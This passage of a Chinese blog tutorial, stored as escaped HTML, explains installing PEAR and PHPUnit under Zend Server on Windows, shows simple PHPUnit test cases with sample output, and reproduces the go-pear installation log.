/&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; %PHP_BIN% -d phar.require_hash=0 PEAR\\go-pear.phar&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pause&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 二、使用 PEAR 来安装 PHPUnit：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR 相当于一个管理程序，要使用 PHPUnit 的话，还必须通过 PEAR 来安装它。注意它也是通过网络从有关的站点实时安装的。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 依次运行命令：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pear channel-discover pear.phpunit.de&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear channel-discover pear.symfony-project.com&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear install phpunit/PHPUnit&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 但运行第三条命令时，报错，提示 PEAR 版本太低，要求大于等于 1.8.1 版本。于是运行命令 pear upgrade pear 对 PEAR 进行升级（从当前的1.7.2 升级到 1.9.1）。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 然后就可以安装上 PHPUnit 了。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR 有很多命令行参数，用来管理安装的软件包，比如：&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear upgrade pear&amp;nbsp; 对 PEAR 自身进行升级&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear info pear&amp;nbsp; 查看 PEAR 信息&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear list&amp;nbsp; 列出已经安装的包&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear list-all&amp;nbsp; 列出所有的包&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear help&amp;nbsp; PEAR 帮助信息&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 运行 phpunit 命令可以看到 phpunit 的有关信息。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; go-pear 安装的 PEAR 的所有的软件包，都在 ~\\Zend\\ZendServer\\bin\\pear 文件夹下，该文件夹被加入到 php.ini 的 include_path 变量中作为库文件的搜索路径之一。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;***** Added by go-pear&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; include_path=&quot;.;C:\\Program Files\\Zend\\ZendServer\\bin\\pear;C:\\Program Files\\Zend\\ZendServer\\share\\ZendFramework\\library&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ;*****&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 所以在书写测试代码时，语句 require_once ''PHPUnit/Framework.php'' 就可以直接寻找到 PHPUnit 的库文件。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 三、使用 PHPUnit 进行单元测试&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 3.1 下面的例子用来测试 sizeof 函数工作的正确性：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;?php&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; require_once ''PHPUnit/Framework.php'';&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; class ArrayTest extends PHPUnit_Framework_TestCase&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; public function testNewArrayIsEmpty()&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /*Create the Array fixture*/&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fixture = array();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /* Assert that the size of the Array * fixture is 0*/&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;assertEquals(0, sizeof($fixture));&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; public function testArrayContainsAnElement()&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /* Create the Array fixture*/&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fixture = array();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /*Add an element to the Array * fixture*/&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fixture[] = ''Element'';&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /*Assert that the size of the * Array fixture is 1*/&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;assertEquals(1, sizeof($fixture));&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ?&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 要点：&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; require_once ''PHPUnit/Framework.php'' 语句是必须的。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 编写的测试用例(usecase)是一个 PHP 脚本，需要在测试用例脚本中包含需要测试的代码。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 测试用例的主体必须写在类中，类名建议和文件名保持一致，还必须是 PHPUnit_Framework_TestCase 的派生类。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 每一个测试用例都是一个 public 类型的成员函数，必须以 test 开头。&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 程序的输出使用 assert* 系列函数（assertEquals、assertNotEquals、assertTrue、assertFalse、assertSame、setExpectedException）来进行验证（参见 &lt;a href=&quot;http://www.phpunit.de/&quot;&gt;&lt;font color=&quot;#015f91&quot;&gt;http://www.phpunit.de&lt;/font&gt;&lt;/a&gt; 网站上的 PHPUnit 手册）。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 运行：&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 该测试用例需要在命令窗口下键入 phpunit ArrayTest.php 来运行，而不是用浏览器打开它。结果如下所示：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\Apache2\\htdocs\\unit_test&amp;gt;phpunit ArrayTest.php&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PHPUnit 3.4.14 by Sebastian Bergmann.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ..&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Time: 1 second, Memory: 3.75Mb&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; OK (2 tests, 2 assertions)&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 其中的两个点“..”表示，两个测试用例全都通过。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 添加一个成员函数：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; public function testArrayContains2Element()&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fixture = array();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fixture[] = ''Element'';&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;assertTrue(sizeof($fixture)==2);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 然后再次测试，报告：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PHPUnit 3.4.14 by Sebastian Bergmann.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ..F&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Time: 0 seconds, Memory: 3.75Mb&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; There was 1 failure:&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1) ArrayTest::testArrayContains2Element&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Failed asserting that &amp;lt;boolean:false&amp;gt; is true.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\Apache2\\htdocs\\unit_test\\ArrayTest.php:27&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; FAILURES!&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Tests: 3, Assertions: 3, Failures: 1.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 其中的“..F”表示，两个测试用例通过，一个失败。并提示了出错的位置。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PHPUnit 命令行工具输出的指示字符：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; .&amp;nbsp; 当测试成功时输出&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; F&amp;nbsp; 当运行测试方法过程中一个断言失败时输出&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; E&amp;nbsp; 当运行测试方法过程中产生一个错误时输出&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; S&amp;nbsp; 当测试被跳过时输出&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; I&amp;nbsp; 当测试被标记为不完整或未实现时输出&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PHPUnit 的失败和错误是不同的。失败是指违反 PHPUnit 语法，例如 assertEquals() 调用失败。错误是指异常或 PHP 错误。有时这种区分非常有用，因为错误通常比失败容易修复。如果你得到一大串问题，最好先解决所有错误，然后再看还有没有失败。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 3.2 使用数据提供者&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 测试方法可接受参数。这些参数将由一个数据提供者方法提供（provider()）。要用到的数据提供着方法是用@dataProvider注解指定的。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 数据提供者方法必须是public和static的，而且返回值必须是数组的数组或者实现了Iterator接口并且每次迭代产生一个数组的对象。对于每个数组（即集合的部分），都将以其内容为参数调用测试方法。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;?php&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; class DataTest extends PHPUnit_Framework_TestCase&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static function provider()&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;return array(&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; array(0, 0, 0),&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; array(0, 1, 1),&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; array(1, 0, 1),&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; array(1, 1, 3)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /**&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; * @dataProvider provider&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; */&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; public function testAdd($a, $b, $c)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;assertEquals($c, $a + $b);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ?&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 附录-1：安装 PEAR 时的输出记录：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ==================================================================&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\ZendServer\\bin&amp;gt;go-pear.bat&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Are you installing a system-wide PEAR or a local copy?&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; (system|local) [system] :&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Below is a suggested file layout for your new PEAR installation.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; To change individual locations, type the number in front of the directory.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Type ''all'' to change all of them or simply press Enter to&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; accept these locations.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1. Installation base ($prefix)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2. Temporary directory for processing&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\tmp&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 3. Temporary directory for downloads&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\tmp&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 4. Binaries directory&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5. PHP code directory ($php_dir)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\pear&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6. Documentation directory&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\docs&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7. Data directory&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\data&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 8. User-modifiable configuration files directory : C:\\Program Files\\Zend\\ZendServer\\bin\\cfg&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 9. Public Web Files directory&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\www&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 10. Tests directory&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\tests&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 11. Name of configuration file&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\WINDOWS\\pear.ini&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 12. Path to CLI php.exe&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1-12, ''all'' or Enter to continue:&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Beginning install...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Configuration written to C:\\WINDOWS\\pear.ini...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Initialized registry...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Preparing to install...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; installing phar://C:/Program Files/Zend/ZendServer/bin/PEAR/go-pear.phar/PEAR/go&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; -pear-tarballs/Archive_Tar-1.3.2.tar...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; installing phar://C:/Program Files/Zend/ZendServer/bin/PEAR/go-pear.phar/PEAR/go&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; -pear-tarballs/Console_Getopt-1.2.3.tar...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; installing phar://C:/Program Files/Zend/ZendServer/bin/PEAR/go-pear.phar/PEAR/go&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; -pear-tarballs/PEAR-1.7.2.tar...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; installing phar://C:/Program Files/Zend/ZendServer/bin/PEAR/go-pear.phar/PEAR/go&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; -pear-tarballs/Structures_Graph-1.0.2.tar...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; pear/PEAR can optionally use package &quot;pear/XML_RPC&quot; (version &amp;gt;= 1.4.0)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; install ok: channel://pear.php.net/Archive_Tar-1.3.2&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; install ok: channel://pear.php.net/Console_Getopt-1.2.3&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; install ok: channel://pear.php.net/Structures_Graph-1.0.2&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; install ok: channel://pear.php.net/PEAR-1.7.2&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: Optional feature webinstaller available (PEAR''s web-based installer)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: Optional feature gtkinstaller available (PEAR''s PHP-GTK-based installer)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: Optional feature gtk2installer available (PEAR''s PHP-GTK2-based installer)&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: To install optional features use &quot;pear install pear/PEAR#featurename&quot;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ******************************************************************************&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; WARNING!&amp;nbsp; The include_path defined in the currently used php.ini does not&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; contain the PEAR PHP directory you just specified:&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;C:\\Program Files\\Zend\\ZendServer\\bin\\pear&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; If the specified directory is also not in the include_path used by&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; your scripts, you will have problems getting any PEAR packages working.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Would you like to alter php.ini &amp;lt;C:\\Program Files\\Zend\\ZendServer\\etc\\php.ini&amp;gt;?&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; [Y/n] : y&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; php.ini &amp;lt;C:\\Program Files\\Zend\\ZendServer\\etc\\php.ini&amp;gt; include_path updated.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Current include path&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : .;C:\\Program Files\\Zend\\ZendServer\\share\\ZendFr&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; amework\\library&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Configured directory&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : C:\\Program Files\\Zend\\ZendServer\\bin\\pear&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Currently used php.ini (guess) : C:\\Program Files\\Zend\\ZendServer\\etc\\php.ini&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Press Enter to continue:&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ** WARNING! Old version found at C:\\Program Files\\Zend\\ZendServer\\bin, please re&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; move it or be sure to use the new c:\\program files\\zend\\zendserver\\bin\\pear.bat&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 